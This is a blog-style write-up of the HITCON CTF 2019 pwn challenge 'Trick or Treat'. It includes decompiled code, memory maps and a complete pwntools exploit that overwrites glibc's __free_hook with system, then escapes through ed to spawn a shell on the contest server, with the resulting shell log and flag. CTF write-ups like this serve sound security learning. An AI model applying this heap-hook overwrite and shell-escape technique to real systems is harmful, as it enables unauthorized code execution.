I"¢Ä<p>HITCON CTF 2019 Qualifiers just finished this weekend, and it was fun! I played with my team <code class="highlighter-rouge">0x1</code> and got 59th place.</p>

<p>I‚Äôve only been really participating in CTFs for about 4.5 months now, and this was my first ‚Äúhard‚Äù level CTF where I actually solved a challenge!</p>

<p>Credits to Angelboy (<a href="https://twitter.com/scwuaptx">@scwuaptx</a>) for this really cool challenge. I also got quite far into one of his other challenges called LazyHouse. Got a libc leak but I couldn‚Äôt figure out how to get past the seccomp sandbox for that challenge. Looking forward to reading other team‚Äôs writeups for that challenge!</p>

<h3 id="challenge"><strong>Challenge</strong></h3>

<ul>
  <li><strong>Category:</strong> pwn</li>
  <li><strong>Points:</strong> 234</li>
  <li><strong>Solves:</strong> 40</li>
</ul>

<blockquote>
  <p>Trick or Treat !!</p>

  <p>nc 3.112.41.140 56746</p>

  <p><a href="http://hitcon-2019-quals.s3-website-ap-northeast-1.amazonaws.com/trick_or_treat-b2f8e79971f6f06e1680869133c6e47e69414c01.tar.gz">trick_or_treat-b2f8e79971f6f06e1680869133c6e47e69414c01.tar.gz</a></p>
</blockquote>

<blockquote>
  <p>Author: Angelboy</p>
</blockquote>

<h3 id="solution"><strong>Solution</strong></h3>

<p>This was a challenge with a very simple concept. I disassembled it, and here is my own interpretation of the pseudocode:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="kt">long</span> <span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="kt">long</span> <span class="kt">int</span> <span class="n">value</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="kt">int</span> <span class="o">*</span><span class="n">chunk</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

  <span class="c1">// Make stdin and stdout unbuffered</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

  <span class="c1">// Malloc a user defined size chunk</span>
  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"Size:"</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span>
  <span class="n">scanf</span><span class="p">(</span><span class="s">"%lu"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
  <span class="n">chunk</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">chunk</span><span class="p">)</span>
  <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Magic:%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">chunk</span><span class="p">);</span> <span class="c1">// Prints out the address of the chunk</span>

    <span class="c1">// Loop twice and ask for an offset for the chunk and a value to write to that offset</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"Offset &amp; Value:"</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
      <span class="n">scanf</span><span class="p">(</span><span class="s">"%lx %lx"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">offset</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">value</span><span class="p">);</span>
      <span class="n">chunk</span><span class="p">[</span><span class="n">offset</span><span class="p">]</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="n">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Basically it lets you do the following:</p>

<ol>
  <li>You can allocate whatever sized chunk you want.</li>
  <li>If the allocation succeeds, you are allowed to pick an offset to that chunk, and a value to write to. You can do this twice.</li>
</ol>

<p>Simple program, the vulnerability lies in the fact that the offset isn‚Äôt checked to see if it fits into the size of the chunk. We can perform a relative write to any memory space adjacent to our chunk. However, if we simply allocate a chunk of, say, size 0x100, our chunk just gets put on the heap, and the memory looks like this:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Start</span>              <span class="n">End</span>                <span class="n">Offset</span>             <span class="n">Perm</span> <span class="n">Path</span>
<span class="mh">0x0000555555554000</span> <span class="mh">0x0000555555555000</span> <span class="mh">0x0000000000000000</span> <span class="n">r</span><span class="o">-</span><span class="n">x</span> <span class="o">/</span><span class="n">ctf</span><span class="o">/</span><span class="n">pwn</span><span class="o">-</span><span class="n">and</span><span class="o">-</span><span class="n">re</span><span class="o">-</span><span class="n">challenges</span><span class="o">/</span><span class="n">hitcon</span><span class="o">-</span><span class="mi">2019</span><span class="o">/</span><span class="n">trick_or_treat</span><span class="o">/</span><span class="n">trick_or_treat</span>
<span class="mh">0x0000555555754000</span> <span class="mh">0x0000555555755000</span> <span class="mh">0x0000000000000000</span> <span class="n">r</span><span class="o">--</span> <span class="o">/</span><span class="n">ctf</span><span class="o">/</span><span class="n">pwn</span><span class="o">-</span><span class="n">and</span><span class="o">-</span><span class="n">re</span><span class="o">-</span><span class="n">challenges</span><span class="o">/</span><span class="n">hitcon</span><span class="o">-</span><span class="mi">2019</span><span class="o">/</span><span class="n">trick_or_treat</span><span class="o">/</span><span class="n">trick_or_treat</span>
<span class="mh">0x0000555555755000</span> <span class="mh">0x0000555555756000</span> <span class="mh">0x0000000000001000</span> <span class="n">rw</span><span class="o">-</span> <span class="o">/</span><span class="n">ctf</span><span class="o">/</span><span class="n">pwn</span><span class="o">-</span><span class="n">and</span><span class="o">-</span><span class="n">re</span><span class="o">-</span><span class="n">challenges</span><span class="o">/</span><span class="n">hitcon</span><span class="o">-</span><span class="mi">2019</span><span class="o">/</span><span class="n">trick_or_treat</span><span class="o">/</span><span class="n">trick_or_treat</span>
<span class="mh">0x0000555555756000</span> <span class="mh">0x0000555555777000</span> <span class="mh">0x0000000000000000</span> <span class="n">rw</span><span class="o">-</span> <span class="p">[</span><span class="n">heap</span><span class="p">]</span> <span class="p">[</span><span class="n">our</span> <span class="n">chunk</span> <span class="n">is</span> <span class="n">here</span><span class="p">]</span>
<span class="mh">0x00007ffff79e4000</span> <span class="mh">0x00007ffff7bcb000</span> <span class="mh">0x0000000000000000</span> <span class="n">r</span><span class="o">-</span><span class="n">x</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mi">2</span><span class="p">.</span><span class="mi">27</span><span class="p">.</span><span class="n">so</span>
<span class="mh">0x00007ffff7bcb000</span> <span class="mh">0x00007ffff7dcb000</span> <span class="mh">0x00000000001e7000</span> <span class="o">---</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mi">2</span><span class="p">.</span><span class="mi">27</span><span class="p">.</span><span class="n">so</span>
<span class="mh">0x00007ffff7dcb000</span> <span class="mh">0x00007ffff7dcf000</span> <span class="mh">0x00000000001e7000</span> <span class="n">r</span><span class="o">--</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mi">2</span><span class="p">.</span><span class="mi">27</span><span class="p">.</span><span class="n">so</span>
<span class="mh">0x00007ffff7dcf000</span> <span class="mh">0x00007ffff7dd1000</span> <span class="mh">0x00000000001eb000</span> <span class="n">rw</span><span class="o">-</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mi">2</span><span class="p">.</span><span class="mi">27</span><span class="p">.</span><span class="n">so</span>
<span class="p">...</span>
</code></pre></div></div>

<p>As you can see, the only place we can write two arbitrary values to will be either on the heap, or back in the <code class="highlighter-rouge">rw</code> .bss segment right before the heap. There is nothing useful in the .bss segment for us to overwrite, and there is also nothing useful in the heap, so how do we solve this challenge?</p>

<p>After a little bit of thinking I remembered that if you pass a large size to <code class="highlighter-rouge">malloc</code> (but smaller than a certain size), <code class="highlighter-rouge">malloc</code> will actually call <code class="highlighter-rouge">mmap</code> to map a completely new memory region. With some trial and error, I found that with a chunk size of <code class="highlighter-rouge">10000000</code>, we can get our mmap‚Äôd chunk to align perfectly with libc:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="err">‚û§</span>  <span class="n">vmmap</span>
<span class="n">Start</span>              <span class="n">End</span>                <span class="n">Offset</span>             <span class="n">Perm</span> <span class="n">Path</span>
<span class="mh">0x0000555555554000</span> <span class="mh">0x0000555555555000</span> <span class="mh">0x0000000000000000</span> <span class="n">r</span><span class="o">-</span><span class="n">x</span> <span class="o">/</span><span class="n">ctf</span><span class="o">/</span><span class="n">pwn</span><span class="o">-</span><span class="n">and</span><span class="o">-</span><span class="n">re</span><span class="o">-</span><span class="n">challenges</span><span class="o">/</span><span class="n">hitcon</span><span class="o">-</span><span class="mi">2019</span><span class="o">/</span><span class="n">trick_or_treat</span><span class="o">/</span><span class="n">trick_or_treat</span>
<span class="mh">0x0000555555754000</span> <span class="mh">0x0000555555755000</span> <span class="mh">0x0000000000000000</span> <span class="n">r</span><span class="o">--</span> <span class="o">/</span><span class="n">ctf</span><span class="o">/</span><span class="n">pwn</span><span class="o">-</span><span class="n">and</span><span class="o">-</span><span class="n">re</span><span class="o">-</span><span class="n">challenges</span><span class="o">/</span><span class="n">hitcon</span><span class="o">-</span><span class="mi">2019</span><span class="o">/</span><span class="n">trick_or_treat</span><span class="o">/</span><span class="n">trick_or_treat</span>
<span class="mh">0x0000555555755000</span> <span class="mh">0x0000555555756000</span> <span class="mh">0x0000000000001000</span> <span class="n">rw</span><span class="o">-</span> <span class="o">/</span><span class="n">ctf</span><span class="o">/</span><span class="n">pwn</span><span class="o">-</span><span class="n">and</span><span class="o">-</span><span class="n">re</span><span class="o">-</span><span class="n">challenges</span><span class="o">/</span><span class="n">hitcon</span><span class="o">-</span><span class="mi">2019</span><span class="o">/</span><span class="n">trick_or_treat</span><span class="o">/</span><span class="n">trick_or_treat</span>
<span class="mh">0x0000555555756000</span> <span class="mh">0x0000555555777000</span> <span class="mh">0x0000000000000000</span> <span class="n">rw</span><span class="o">-</span> <span class="p">[</span><span class="n">heap</span><span class="p">]</span>
<span class="mh">0x00007ffff6fe3000</span> <span class="mh">0x00007ffff79e4000</span> <span class="mh">0x0000000000000000</span> <span class="n">rw</span><span class="o">-</span> <span class="p">[</span><span class="n">our</span> <span class="n">chunk</span> <span class="n">is</span> <span class="n">now</span> <span class="n">here</span><span class="p">]</span>
<span class="mh">0x00007ffff79e4000</span> <span class="mh">0x00007ffff7bcb000</span> <span class="mh">0x0000000000000000</span> <span class="n">r</span><span class="o">-</span><span class="n">x</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mi">2</span><span class="p">.</span><span class="mi">27</span><span class="p">.</span><span class="n">so</span>
<span class="mh">0x00007ffff7bcb000</span> <span class="mh">0x00007ffff7dcb000</span> <span class="mh">0x00000000001e7000</span> <span class="o">---</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mi">2</span><span class="p">.</span><span class="mi">27</span><span class="p">.</span><span class="n">so</span>
<span class="mh">0x00007ffff7dcb000</span> <span class="mh">0x00007ffff7dcf000</span> <span class="mh">0x00000000001e7000</span> <span class="n">r</span><span class="o">--</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mi">2</span><span class="p">.</span><span class="mi">27</span><span class="p">.</span><span class="n">so</span>
<span class="mh">0x00007ffff7dcf000</span> <span class="mh">0x00007ffff7dd1000</span> <span class="mh">0x00000000001eb000</span> <span class="n">rw</span><span class="o">-</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mi">2</span><span class="p">.</span><span class="mi">27</span><span class="p">.</span><span class="n">so</span>
<span class="p">...</span>
</code></pre></div></div>

<p>Now that it is aligned to libc, we can overwrite stuff in libc! Of course the first thing that comes to mind is to overwrite <code class="highlighter-rouge">__malloc_hook</code> or <code class="highlighter-rouge">__free_hook</code> to get a shell, but since the program doesn‚Äôt call <code class="highlighter-rouge">malloc</code> or <code class="highlighter-rouge">free</code> ever again after allocating our first chunk, how does it work?</p>

<p>Well, the trick is in <code class="highlighter-rouge">scanf</code>. If you pass a very large input into <code class="highlighter-rouge">scanf</code>, it will internally call both <code class="highlighter-rouge">malloc</code> and <code class="highlighter-rouge">free</code> to create a temporary buffer for your input on the heap. Let‚Äôs start by calculating addresses that we need:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./trick_or_treat'</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc.so.6'</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./trick_or_treat'</span><span class="p">)</span>
<span class="c1">#p = remote('3.112.41.140', 56746)
</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'new-window'</span><span class="p">]</span>

<span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

<span class="c1"># Get a new mmapped chunk right before libc
# also aligned with libc
</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'10000000'</span><span class="p">)</span>

<span class="n">chunk</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">':'</span><span class="p">)[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">chunk</span> <span class="o">+</span> <span class="mh">0x989ff0</span> <span class="c1"># Found using gdb, always constant
</span><span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__free_hook'</span><span class="p">]</span>
<span class="n">free_hook_off</span> <span class="o">=</span> <span class="p">(</span><span class="n">free_hook</span> <span class="o">-</span> <span class="n">chunk</span><span class="p">)</span> <span class="o">/</span> <span class="mi">8</span> <span class="c1"># offset to __free_hook
</span><span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
</code></pre></div></div>

<p>Next, here is what I tried:</p>

<ol>
  <li>I tried overwriting <code class="highlighter-rouge">__malloc_hook</code> with all the one gadgets, and none of them worked (FAIL).</li>
  <li>I tried overwriting <code class="highlighter-rouge">__free_hook</code> with all the one gadgets, and none of them worked (FAIL).</li>
  <li>Then, I thought of overwriting <code class="highlighter-rouge">__free_hook</code> with <code class="highlighter-rouge">system</code>, and then passing <code class="highlighter-rouge">'/bin/sh;'</code> as the first 8 bytes in our huge <code class="highlighter-rouge">scanf</code> buffer. That way when <code class="highlighter-rouge">free</code> is called internally in <code class="highlighter-rouge">scanf</code>, it will call <code class="highlighter-rouge">system("/bin/sh;blahblahblah...")</code> giving us a shell, but there was a problem.</li>
</ol>

<p>The problem is in this line:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"Offset &amp; Value:"</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
  <span class="n">scanf</span><span class="p">(</span><span class="s">"%lx %lx"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">offset</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">value</span><span class="p">);</span> <span class="c1">// &lt;- PROBLEM</span>
  <span class="n">chunk</span><span class="p">[</span><span class="n">offset</span><span class="p">]</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The problem is with <code class="highlighter-rouge">%lx</code>, it means that in our huge <code class="highlighter-rouge">scanf</code> buffer, we can only pass in hexadecimal characters (<code class="highlighter-rouge">0123456789abcdef</code>). With that, there is no way to call <code class="highlighter-rouge">/bin/sh</code>.</p>

<p>I thought for a while on how to bypass this hexadecimal-only filter. I then went through my VM‚Äôs <code class="highlighter-rouge">/usr/bin</code> folder and looked for any programs that I can run. I found <code class="highlighter-rouge">c89</code>, <code class="highlighter-rouge">c99</code>, <code class="highlighter-rouge">cc</code>, and <code class="highlighter-rouge">ed</code>.</p>

<p>I immediately remembered reading a writeup of some HackTheBox machine where the solution was to escape a restricted shell using <code class="highlighter-rouge">ed</code>, so I gave that a shot, and it worked.</p>

<p>The exploit is simple, we overwrite <code class="highlighter-rouge">__free_hook</code> with <code class="highlighter-rouge">system</code> and then call <code class="highlighter-rouge">system("ed")</code>, and then escape out of <code class="highlighter-rouge">ed</code> by typing <code class="highlighter-rouge">!/bin/sh</code>.</p>

<p>My exploit script behaved a bit weird, but here is the final script:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./trick_or_treat'</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc.so.6'</span><span class="p">)</span>

<span class="c1">#p = process('./trick_or_treat')
</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'3.112.41.140'</span><span class="p">,</span> <span class="mi">56746</span><span class="p">)</span>

<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'new-window'</span><span class="p">]</span>

<span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

<span class="c1"># Get a new mmapped chunk right before libc
# also aligned with libc
</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'10000000'</span><span class="p">)</span>

<span class="n">chunk</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">':'</span><span class="p">)[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">chunk</span> <span class="o">+</span> <span class="mh">0x989ff0</span> <span class="c1"># Found using gdb, always constant
</span><span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__free_hook'</span><span class="p">]</span>
<span class="n">free_hook_off</span> <span class="o">=</span> <span class="p">(</span><span class="n">free_hook</span> <span class="o">-</span> <span class="n">chunk</span><span class="p">)</span> <span class="o">/</span> <span class="mi">8</span> <span class="c1"># Offset to __free_hook
</span><span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>

<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Chunk: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">chunk</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'__free_hook: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'free_hook_off: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">free_hook_off</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'system: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Libc base: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>

<span class="c1"># Overwrite __free_hook with system
</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'{} {}'</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">free_hook_off</span><span class="p">),</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">)))</span>

<span class="k">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

<span class="c1"># Make scanf call malloc followed by free
</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'A'</span><span class="o">*</span><span class="mi">50000</span><span class="p">)</span>

<span class="c1"># Call system('ed')
</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'ed'</span><span class="p">)</span>

<span class="c1"># Escape out of ed and get a shell
</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'!/bin/sh'</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

</code></pre></div></div>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu-bionic:/ctf/pwn-and-re-challenges/hitcon-2019/trick_or_treat<span class="nv">$ </span>./exploit.py 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/pwn-and-re-challenges/hitcon-2019/trick_or_treat/trick_or_treat'</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/pwn-and-re-challenges/hitcon-2019/trick_or_treat/libc.so.6'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
<span class="o">[</span>+] Opening connection to 3.112.41.140 on port 56746: Done
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Chunk: 0x7f56a3973010
<span class="o">[</span><span class="k">*</span><span class="o">]</span> __free_hook: 0x7f56a46ea8e8
<span class="o">[</span><span class="k">*</span><span class="o">]</span> free_hook_off: 0x1aef1b
<span class="o">[</span><span class="k">*</span><span class="o">]</span> system: 0x7f56a434c440
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Libc base: 0x7f56a42fd000
Offset &amp; Value:<span class="se">\x</span>00
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
Offset &amp; Value:<span class="se">\x</span>00<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>trick_or_treat<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>trick_or_treat<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>trick_or_treat<span class="o">)</span>
<span class="nv">$ </span><span class="nb">cat</span> /home/<span class="k">*</span>/flag
hitcon<span class="o">{</span>T1is_i5_th3_c4ndy_for_yoU<span class="o">}</span>
</code></pre></div></div>
:ET